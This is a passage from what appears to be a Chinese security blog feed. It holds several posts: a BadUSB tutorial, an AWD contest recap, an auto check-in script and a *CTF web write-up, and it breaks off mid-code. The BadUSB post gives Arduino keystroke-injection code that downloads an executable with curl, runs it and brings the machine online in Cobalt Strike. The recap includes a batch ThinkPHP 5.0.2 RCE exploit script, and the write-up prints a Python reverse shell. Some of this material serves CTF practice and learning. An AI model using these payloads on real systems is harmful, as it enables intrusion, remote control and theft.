        <content type="html"><![CDATA[<blockquote><p>前言：</p><p>近期在公司内部学了一点红队技能，虽然目前用不上，但是做个记录，顺便发牢骚。</p></blockquote><h1 id="致谢-amp-参考"><a href="#致谢-amp-参考" class="headerlink" title="致谢&amp;参考"></a>致谢&amp;参考</h1><p><a href="https://www.freebuf.com/articles/system/261020.html">https://www.freebuf.com/articles/system/261020.html</a></p><p><a href="https://blog.csdn.net/sxhexin/article/details/87914649">https://blog.csdn.net/sxhexin/article/details/87914649</a></p><p><a href="https://www.anquanke.com/post/id/227477">https://www.anquanke.com/post/id/227477</a></p><p><a href="https://www.freebuf.com/articles/system/261020.html">https://www.freebuf.com/articles/system/261020.html</a></p><h1 id="Badusb-插入上线cobalt-strike"><a href="#Badusb-插入上线cobalt-strike" class="headerlink" title="Badusb 插入上线cobalt strike"></a>Badusb 插入上线cobalt strike</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>ATtiny85 开发板、arduino IDE下载<a href="https://www.arduino.cc/en/Main/Softwaredigispark%E3%80%82%E6%9A%82%E6%97%B6%E5%85%88%E4%B8%8D%E8%A6%81%E8%A3%85%E9%A9%B1%E5%8A%A8%EF%BC%81%EF%BC%81%E9%A9%B1%E5%8A%A8%E6%9C%89%E5%A4%A7%E5%9D%91%E3%80%82">https://www.arduino.cc/en/Main/Softwaredigispark。暂时先不要装驱动！！驱动有大坑。</a></p><p>看freeebuf里面的教程装完驱动，烧录完只能执行一次，需要更新下固件才可以重复使用，后面会提到。</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>打开IDE,在文件-&gt;首选项中加入附加开发板管理，附加开发板管理网址处写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;digistump.com&#x2F;package_digistump_index.json</span><br></pre></td></tr></table></figure><p>注意，这里需要翻墙，后面添加开发板下载相关配置时也需要翻墙，现在就翻着 别断了。</p><h2 id="添加开发板"><a href="#添加开发板" class="headerlink" title="添加开发板"></a>添加开发板</h2><p>IDE中-工具-开发板管理，类型-contributed/贡献，选择</p><img src="http://cdn.polowong.top/static/images/boards.png"><p>然后选安装（翻墙）</p><p>安装好后，选择这个16.5mhz的开发板。</p><img src="http://cdn.polowong.top/static/images/1655.png"><h2 id="更新-boot-loader"><a href="#更新-boot-loader" class="headerlink" title="更新 boot loader"></a>更新 boot loader</h2><p>更新 BootLoader的教程看 <a href="https://blog.csdn.net/sxhexin/article/details/87914649%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%8D%E5%86%8D%E8%B5%98%E8%BF%B0%EF%BC%8C%E8%B7%9F%E7%9D%80%E8%BF%99%E4%B8%AA%E6%95%99%E7%A8%8B%E8%B5%B0%E6%B2%A1%E9%97%AE%E9%A2%98%E7%9A%84%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%BD%A0%E4%B9%8B%E5%89%8D%E6%9C%89%E8%A3%85%E7%9B%B8%E5%85%B3%E9%A9%B1%E5%8A%A8%EF%BC%8C%E8%AF%B7%E6%8A%8A%E9%A9%B1%E5%8A%A8%E5%8D%B8%E8%BD%BD%E5%B9%B2%E5%87%80%EF%BC%81%EF%BC%81%EF%BC%81">https://blog.csdn.net/sxhexin/article/details/87914649，这里不再赘述，跟着这个教程走没问题的，如果你之前有装相关驱动，请把驱动卸载干净！！！</a></p><p>更新BootLoader是因为避免踩烧录完只能运行一次的坑！！</p><p>BootLoader是大坑，一定要好好弄！</p><h2 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h2><p>有兴趣一步步走的可以写个测试代码 cmd弹个窗什么的，我这里一步到位，直接远程加载exe。</p><p>对于cs 可以生成powershell，然后cmd里面powershell加载调用直接上线。</p><h2 id="使用CMD远程下载可执行文件"><a href="#使用CMD远程下载可执行文件" class="headerlink" title="使用CMD远程下载可执行文件"></a>使用CMD远程下载可执行文件</h2><p>我选择用cmd的原因是因为 我还不会powershell免杀（2333）</p><p>所以 探索了下 如何类似Linux执行多条命令，发现在Windows cmd下是and符号&amp;。</p><p>执行命令的代码框架如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;DigiKeyboard.h&quot;</span><span class="comment">//库文件</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// setup函数只运行一次</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">2000</span>);<span class="comment">//等待两秒，给电脑自动加载配置时间</span></span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);<span class="comment">//摁住WIN键</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);<span class="comment">//等待300毫秒</span></span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;cmd&quot;</span>);<span class="comment">//输入CMD</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;curl http://12xxxx0/calc.exe &gt; E:\\calc.exe &amp; E:\\calc.exe&quot;</span>);<span class="comment">//执行PAYLOAD，双引号需要斜杠转义</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，在最后一个注释处，是在前面语句打开cmd黑框的情况下，在cmd中输入的语句。两个反斜杠是为了转义。</p><p>我的思路是，将可执行exe文件上传至服务器，通过curl的方式下载并重定向至某个驱动器并执行。</p><p>我本来想放到C盘，但是放到C盘，有可能存在权限问题（放在C:\Windows\Temp）目录下也有些问题，于是放到了D/E盘。</p><p>将上述代码在IDE中输入后ctrl+u上传，然后插入attiny85 </p><img src="http://cdn.polowong.top/static/images/in1.png"><p>一定是先拔出来，出现这个 60seconds的时候插进去，出现下面这一串代表写入成功 并且会自动执行一次。</p><p>然后拔出来 再插进去的时候 就有弹计算器的效果了。（小思考，如何在执行完exe后自动关闭cmd黑框？）</p><p>效果如下：</p><img src="http://cdn.polowong.top/static/images/反弹.gif"><h2 id="CMD上线CS"><a href="#CMD上线CS" class="headerlink" title="CMD上线CS"></a>CMD上线CS</h2><p>嫖来了大佬的免杀方法2333 试一下exe上线cs</p><img src="http://cdn.polowong.top/static/images/cs.gif"><p>小思考的答案是：命令后跟&amp; exit;</p><p>23333 </p><h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><p><img src="http://cdn.polowong.top/1635999756597dkayi5vd.png?imageslim" alt="paste image"><br>5pyA6L+R5LiN5pivaHfkuYjvvIzorqTor4bkuIDkuKrlhazlj7jnmoRocuWnkOWnkO+8jOacgOi/keS5n+WcqGh35oub5Lq677yM6ZyA6KaB5LiA5Lqb5pyJ5omL5bCx6KGM55qE5bKX5L2N77yM5a+55rKh5Y67aHfov4cg5bm25LiU5oqA5pyv5LiN5oCO5LmI5qC355qE5ZCM5a2m5p2l6K+077yMNDAw5LiA5aSp55qE5b6F6YGH44CB5YyF5ZCD5L2P44CB5LiN6ZyA6KaB6Ieq5bex5Z6r6ZKx44CB6aG555uu546w5Zy65pyJ5Lq65bim77yM5oiR6KeJ5b6X5bey57uP5b6I5aW95ZWm44CC5aaC5p6c5oiR5aSn5LqM55qE5pe25YCZ5pyJ6L+Z56eN5py65Lya77yM5ZOq5oCV5LiN57uZ5oiR5bel6LWE77yM5oiR5Lmf6KaB5Y6744CC5oiR5L2c5Li65LiA5Liq5a2m55Sf77yM6Zmk5LqG5aSW5Ye66Ieq5bex5o6l6aG555uu77yM5a6e5Zyo5piv5oOz5LiN5Yiw6L+Y5pyJ5LuA5LmI5q+UaHfmm7Tlpb3nmoTog73nm7jlr7nku47nroDljZXlvIDlp4vmjqXop6blronlhajlrp7miJjnmoTlnLrmma/kuobjgILvvIhTUkPkuI3nrpfvvIxTUkPkuZ/pnIDopoHnm7jlvZPnmoTlronlhajln7rnoYDjgILvvInmiJHmiorov5nkuKrmtLvmjqjov4fljrvkuYvlkI7vvIzkuInkuKrluIjlvJ/kuZ/lvojnu5nlipvvvIzpgJrov4fkuobpnaLor5XjgILlj6/kuIfkuIfmsqHmg7PliLDor7flgYfnmoTml7blgJnlh7rpl67popjkuobvvIzlr7zlkZjor7TnjrDlnKjnmoTph43lv4PlupTor6XmmK/kuJPkuJror77lrabkuaDjgIHogIzkuI3mmK/mg7PnnYDlh7rljrvlrp7kuaDvvIzlubbkuJTmi7/miJHkuL7kvovlrZAyMzMz44CC5pyA5ZCO6L+Y6K+077yM5Y+q6KaB5L2g5Y675LqG5bCx57uZ5L2g6YCA5a2m77yM55yf5LiN5oiz44CC54S26ICM5pu05Y+v56yR55qE5piv77yM5p+Q6ICB5biI5ZyoMTfnuqfpgJrnn6XnvqTlj5Hkuoblj6bkuIDlrrbmnLrmnoTnmoRod+Wuo+S8oO+8jOW+hemBh+aIkeS5n+ivtOS4i++8jDMwMC00MDDkuIDlpKnvvIzkuI3ljIXlkIPkvY/vvIzmnInlhY3otLnln7norq3vvIzmoLnmja7ln7norq3ogIPmoLjnu5PmnpzliIbnuqLok53pmJ/vvIjvvJ/vvInvvIznhLblkI7miJHmiZPnlLXor53ov4fljrvpl67kuobkuIvvvIzmu6HlmLTot5/miJHosIjnkIbmg7PosIjpgZPlvrfosIjmioDmnK/jgIHlsLHor7TlrabnlJ/kuI3opoHogIHmg7PnnYDmjKPpkrHkupHkupHjgILmiJHkvLDorqEg5LiN57uZ5oiR6L+Z5LiJ5Liq5biI5byf5YGH55qE5Y6f5Zug77yM5bqU6K+l5piv5Yqo5LqG5LuW5Lus55qE6JuL57OV5LqG5ZCn77yM5LuO6YKj6L656LWw6IO95oq96ZKxMjMzM+OAguWtpumZouWvueaIkeW+iOWlveOAgeWQhOS9jemihuWvvOiAgeW4iOWSjOiUvOWPr+S6su+8jOWtpumZouS5n+e7meS6huaIkeaOqOWFjeWQjemine+8jOmhuuWIqeaOqOWFjeiHs1VFU1RD44CC5b+D5oCA5oSf5oGp5LmL5b+D77yM5oOz5o6o5biI5byf5LiA5oqK77yM5Y67aHfvvIzmsqHmg7PliLDnq5/nhLbkuI3nu5nlh4blgYfvvIznnJ/nmoTvvIzlv4Pph4zpnaLlh4nkuoblvojlpJrjgILkuI3or7TkuoZ+57un57ut5YaZ5q+V5Lia6K665paH5LqGfg==</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>近一年学习总结</title>
      <link href="2021/03/06/%E8%BF%91%E4%B8%80%E5%B9%B4%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
      <url>2021/03/06/%E8%BF%91%E4%B8%80%E5%B9%B4%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>虽然接触安全从初中就算开始了，但当时也仅仅是停留于混混娱乐圈，日一日别人的webshell。</p><p>大一大二对安全知识的学习较少，大二外出打了两次比赛，成绩较差，直接白给。</p><p>大三寒假疫情在家的时候算是正式开始学习安全知识，做最简单的靶场，刷题，前两次正经打的比赛是I春秋高校抗疫和BJDCTF。</p><p>这是一个纠结的过程，因为在那个阶段我还要准备保研，还在保研和考研两者之间摇摆。</p><p>最终下定决心冲一冲，那是三月底。某公众号预测我保研成功率在30%左右。</p><p>具体学什么知识在这里也不想说了，算是从最基础的开始学习吧，印象比较深的是LFI。现在我XSS和注入玩的也不好，算是只会用工具跑跑。</p><p>保完研之后有些许松懈，对安全知识的学习有些懈怠了，SRC还没开始搞，到现在上班时间也不太充裕。</p><p>现在正好是三月初，距离我开始正式接触安全也差不多一年的时间，在这一年里，我做到了：</p><p>1.两份渗透岗实习经历</p><p>2.两次通过护网面试，一次中级，一次初级。（蓝队</p><p>3.拿到五所985网络安全专业OFFER,其中四个学硕;</p><p>4.数次参加线上赛，虽然白给的较多</p><p>5.两次带队参加省赛</p><p>6.开始打AWD</p><p>7.独立发表一篇论文</p><p>8.独立完成两个小项目</p><p>9.美赛建模一等奖</p><p>10.自费MacBook Pro</p><p>11.经济独立</p><p>12.顺利保研</p><p>下一年渴望更健康的身体与相对坚强的意志，至少不能中午一觉睡三个小时。</p><p>仅此记录</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次线上AWD</title>
      <link href="2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/"/>
      <url>2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/</url>
      
        <content type="html"><![CDATA[<p>最近打了一次线上AWD，算是第一次正式打AWD,表现不太好，前期看了一些AWD的思路和套路，但是没有真正应用于实际的AWD环境中，随做一次记录，记录这里面存在的问题以及没做好的地方。</p><h1 id="开赛"><a href="#开赛" class="headerlink" title="开赛"></a>开赛</h1><p>开局给了ssh和web服务以及要求，如果被check down了，每轮扣100分（当时不知道每轮扣100分，以为一共扣100，每次restart需要扣100并且重置环境，所以就一直没restart）</p><h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><p>拿到ssh权限后首先备份了文件，用D盾、河马webshell专杀工具对web环境进行杀毒，想查杀webshell。</p><p>在webshell查杀环节中，使用河马webshell专杀工具和D盾杀了一个shell，但是有免杀shell没杀出来（一般AWD会内置多个后门），由于时间原因也没有细看，造成的后果是被传了不死马。（这是后话了。</p><p>在webshell查杀环节中应改进的地方是：</p><p>1.采用多种工具综合查杀webshell</p><p>2.对疑似后门文件手工查看，不能完全相信工具。</p><h3 id="弱点1"><a href="#弱点1" class="headerlink" title="弱点1"></a>弱点1</h3><p>流量监控脚本没挂上去，导致监控流量失败，无法得知有哪些payload是发起了攻击。</p><h2 id="自检"><a href="#自检" class="headerlink" title="自检"></a>自检</h2><p>通过观察web服务以及报错页面，出现了经典的十年磨一剑—-TP5.0.2，于是立刻想到了TP5.0.2的RCE。</p><p>网上收集payload后打了一波cat/flag，成功，并且通过该方式拿到了其他队伍的flag，遂考虑采用脚本编写EXP批量getflag并通知负责防护的队员修复相关漏洞。</p><h3 id="弱点2"><a href="#弱点2" class="headerlink" title="弱点2"></a>弱点2</h3><p>在修复时浪费了太多的时间，负责修复的队员无法尽快修复，并在上传修复后的文件时遇到了权限问题。</p><h3 id="弱点3"><a href="#弱点3" class="headerlink" title="弱点3"></a>弱点3</h3><p>临场紧张+payload不熟悉</p><p>我真的吐了。当时太紧张了，之前利用TP5的payload也是复制粘贴，这两个因素加起来导致我在Hackbar能顺利打payload，Burp也可以，但到了写脚本的时候就不行。因为payload是四个键值对，我写脚本的时候只写了一个。</p><p>贴一下我当时写的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests,json</span><br><span class="line">url=<span class="string">&quot;http://47.104.144.188:&quot;</span></span><br><span class="line">rest=<span class="string">&quot;/index.php?s=captcha&quot;</span></span><br><span class="line">data=&#123;<span class="string">&#x27; _method&#x27;</span>:<span class="string">&#x27;__construct&amp;filter%5B%5D=system&amp;get%5B%5D=cat+%2Fflag&amp;method=get&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9001</span>,<span class="number">9051</span>):</span><br><span class="line">    urls=<span class="built_in">str</span>(url+<span class="built_in">str</span>(port)+rest)</span><br><span class="line">    response=requests.post(url=urls,data=data)</span><br><span class="line">    <span class="built_in">print</span> (response.text)</span><br></pre></td></tr></table></figure><h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><p>在拿到一个并且唯一一个payload后，由于没有编写出批量利用脚本，遂考虑手动打，导致的得分缓慢。</p><h3 id="弱点4"><a href="#弱点4" class="headerlink" title="弱点4"></a>弱点4</h3><p>临场脚本编写能力欠缺</p><p>在编写脚本的过程中，需要用到对html标签解析的库（叫啥忘了）、多线程（批量getflag和提交flag），但由于很久没写多线程了，所以忘了多线程咋用了。。而且解析html标签还是大二学爬虫的时候写的，太过久远，也搞忘记了。所以最后脚本也没跑起来，耽误了太多时间。</p><h3 id="弱点5"><a href="#弱点5" class="headerlink" title="弱点5"></a>弱点5</h3><p>对AWD赛制不熟悉，机器至少down了三分之一的比赛时间，5分钟一轮，一轮掉100分。我说怎么越交flag分越少。。绝了。</p><h1 id="反思与改进"><a href="#反思与改进" class="headerlink" title="反思与改进"></a>反思与改进</h1><h2 id="提升脚本编写能力"><a href="#提升脚本编写能力" class="headerlink" title="提升脚本编写能力"></a>提升脚本编写能力</h2><p>不说了。多写多看多寻思 多借鉴别人的思路，掌握基本库的用法。</p><p><strong>先把多线程和xpath解析学会了！！！</strong></p><h2 id="提升payload熟练度"><a href="#提升payload熟练度" class="headerlink" title="提升payload熟练度"></a>提升payload熟练度</h2><p>要求平时复现过程中不能拿到直接打，要分析原理与利用链。</p><h2 id="提升运维水平"><a href="#提升运维水平" class="headerlink" title="提升运维水平"></a>提升运维水平</h2><p>赛前看到了安恒低权限EDR，但是部署起来看起来麻烦，就没搞，但是流量监控脚本也没挂上去，以后需要提前部署并实践相关脚本与环境。</p><p>控制好相关文件的读写权限等。</p><h2 id="提升应急反应能力"><a href="#提升应急反应能力" class="headerlink" title="提升应急反应能力"></a>提升应急反应能力</h2><p>要通过流量脚本观察是否有入侵与挂马行为，学会如何处理不死马等紧急情况。</p><h2 id="提升反制能力"><a href="#提升反制能力" class="headerlink" title="提升反制能力"></a>提升反制能力</h2><p>要能通过别人打的payload反打别人</p><h2 id="完善武器库"><a href="#完善武器库" class="headerlink" title="完善武器库"></a>完善武器库</h2><p>多收集webshell查杀工具、积累webshell免杀方式、收集常见漏洞EXP。</p>]]></content>
      
      
      
        <tags>
            
            <tag> awd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>智慧曲园自动签到+微信推送</title>
      <link href="2021/01/19/server%E9%85%B1%E5%AE%9E%E7%8E%B0%E7%AD%BE%E5%88%B0%E6%8F%90%E9%86%92/"/>
      <url>2021/01/19/server%E9%85%B1%E5%AE%9E%E7%8E%B0%E7%AD%BE%E5%88%B0%E6%8F%90%E9%86%92/</url>
      
        <content type="html"><![CDATA[<h1 id="智慧曲园自动签到"><a href="#智慧曲园自动签到" class="headerlink" title="智慧曲园自动签到"></a>智慧曲园自动签到</h1><p><a href="https://github.com/polosec/qfnuAutoTemperatureSubmit">https://github.com/polosec/qfnuAutoTemperatureSubmit</a></p><p>使用方法：</p><p>首先安装环境依赖 pip3 install requests</p><p>将该脚本上传至服务器 （我的路径是/root）</p><p>新建脚本 auto.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /root/demo1.py xxxxx  xxxxxxx &gt;1.txt ; python3 /root/serverjiang.py </span><br></pre></td></tr></table></figure><p>新建定时任务</p><p>crontab -e  1 0 * * * /root/auto.sh  </p><p>每天凌晨0点1分自动执行 /root/auto.sh 这条命令</p><h1 id="绑定server酱"><a href="#绑定server酱" class="headerlink" title="绑定server酱"></a>绑定server酱</h1><p>在server酱绑定微信后，拿到key，放到下面脚本 <strong>yourkey</strong> 这个地方。</p><p>serverjiang.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests,json</span><br><span class="line">url=<span class="string">&quot;http://sc.ftqq.com/yourkey.send?text=&quot;</span></span><br><span class="line">data=<span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>).readline()</span><br><span class="line">data=json.loads(data)</span><br><span class="line">data=data[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line">text=<span class="built_in">str</span>(data)</span><br><span class="line">desp=<span class="string">&quot;success&quot;</span></span><br><span class="line">url=url+text+<span class="string">&quot;&amp;desp=&quot;</span>+desp</span><br><span class="line">r=requests.get(url=url).text</span><br></pre></td></tr></table></figure><h1 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h1><p>每天0点1分自动提交体温上报请求，并且将返回的信息（成功/错误）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF/*CTF web4</title>
      <link href="2021/01/18/XCTF-CTF-web4/"/>
      <url>2021/01/18/XCTF-CTF-web4/</url>
      
        <content type="html"><![CDATA[<p>上周末刚结束了*ctf的比赛，又摸鱼了。。赛后看雪宝的wp复现出来的，发现是socket写的有点问题 搞到夜里三点也没搞出来 wtcl</p><h1 id="oh-my-socket"><a href="#oh-my-socket" class="headerlink" title="oh my socket"></a>oh my socket</h1><p>题目分析：</p><p>直接给了一堆docker 先跑起来看看是什么</p><p>docker-compose up -d</p><p>跑起来了三个容器 分别是 server client webserver</p><p>先整理下网络环境情况：</p><p>webserver 172.21.0.4</p><p>server 172.21.0.2</p><p>client 172.21.0.3</p><p>首先访问webserver</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> STDOUT, check_output</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        f.save(os.path.join(f.filename))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            output = check_output([<span class="string">&#x27;python3&#x27;</span>, f.filename], stderr=STDOUT, timeout=<span class="number">80</span>)</span><br><span class="line">            content = output.decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            content = e.__str__()</span><br><span class="line"></span><br><span class="line">        os.system(<span class="string">&#x27; &#x27;</span>.join([<span class="string">&#x27;rm&#x27;</span>, f.filename]))</span><br><span class="line">        <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   app.run(port=<span class="number">5000</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>通过对源码进行审计 发现上传文件后会执行文件里面的内容，于是尝试反弹shell，上传如下脚本：</p><p>这里请注意理解该段代码的作用，和bash -i那个的原理相似，都是将std out std in std err重定向至socket。</p><p>详细的分析链接放在了最后面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os </span><br><span class="line"> </span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">s.connect((<span class="string">&quot;ip&quot;</span>,<span class="number">6666</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>) </span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure><p>本地监听搞起来，然后上传，得到反弹过来的shell</p><p>下面审计server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;172.21.0.2&#x27;</span></span><br><span class="line">PORT = <span class="number">21587</span></span><br><span class="line">BUFSIZ = <span class="number">1024</span></span><br><span class="line">ADDR = (HOST, PORT)</span><br><span class="line"></span><br><span class="line">tcpSerSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpSerSock.bind(ADDR)</span><br><span class="line">tcpSerSock.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;waiting for connection...&#x27;</span>)</span><br><span class="line">    tcpCliSock, addr = tcpSerSock.accept()</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;...connnecting from:&#x27;</span>, addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = tcpCliSock.recv(BUFSIZ)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">b&#x27;*ctf&#x27;</span>:</span><br><span class="line">                content = <span class="built_in">open</span>(<span class="string">&#x27;oh-some-funny-code&#x27;</span>).read()</span><br><span class="line">                tcpCliSock.send((content.encode()))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tcpCliSock.send((<span class="string">&#x27;[%s] %s&#x27;</span> % (ctime(), data)).encode())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cnt &gt;= <span class="number">2</span>:</span><br><span class="line">        time.sleep(<span class="number">120</span>)</span><br><span class="line">        tcpSerSock.close()</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">tcpSerSock.close()</span><br></pre></td></tr></table></figure><p>得到flag的条件是发送的数据为b’*ctf’</p><p>发现这个socket写的有些问题，连接大于2时就断开了，所以需要尝试自己写个socket连进去，防止别人在连，要一直循环。</p><p>于是得到如下client的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 